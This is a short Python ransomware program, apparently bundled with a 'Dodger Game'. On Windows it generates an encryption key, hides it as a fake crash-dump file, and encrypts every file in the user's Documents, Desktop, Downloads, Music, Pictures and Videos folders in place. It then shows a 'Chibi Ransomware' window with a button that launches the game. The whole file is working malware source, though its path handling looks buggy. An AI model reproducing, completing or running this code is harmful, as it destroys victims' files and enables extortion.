from importlib.resources import contents
import os
if os.name != 'nt':
    exit()
from tkinter import *
from PIL import ImageTk, Image
from cryptography.fernet import Fernet

def walk_through(user_dir, key_encrypt):
    for root, subdirectories, files in os.walk(os.path.expanduser('~') + '\\' + user_dir):
        for file in files:
            if 'Dodger Game' in os.path.abspath(file):
                continue
            if 'The Dodger Game' in file or 'explorer.exe.2534O.dmp' in file:
                continue
            if os.path.isfile(file):
                with open(file, 'rb') as thefile:
                    contents = thefile.read()
                contents_encrypted = Fernet(key_encrypt).encrypt(contents)
                with open(file, 'wb') as thefile:
                    thefile.write(contents_encrypted)

def run_dodger():
    root.destroy()
    import dodger

if os.path.exists(os.path.expandvars(r'%LOCALAPPDATA%\\CrashDumps')+'\\explorer.exe.2534O.dmp'):
    import dodger
else:
    key = Fernet.generate_key()

    with open(os.path.expandvars(r'%LOCALAPPDATA%\\CrashDumps')+'\\explorer.exe.2534O.dmp', 'wb') as thekey:
        thekey.write(key)

    walk_through('Documents', key)
    walk_through('Desktop', key)
    walk_through('Downloads', key)
    walk_through('Music', key)
    walk_through('Pictures', key)
    walk_through('Videos', key)

    root = Tk()
    root.title("Chibi Ransomware")
    root.geometry("700x650")
    splash_label = Label(root)
    bgimg=ImageTk.PhotoImage(Image.open("umm.png"))
    bg = Label(root, image = bgimg)
    bg.place(x = 0, y = 0)
    root.resizable(False, False)
    w = Button (text="Click me ;)", command=run_dodger, width=40, height=3, relief="raised", activebackground="#00ff00")
    w.place(x = 30, y = 570)

    root.mainloop()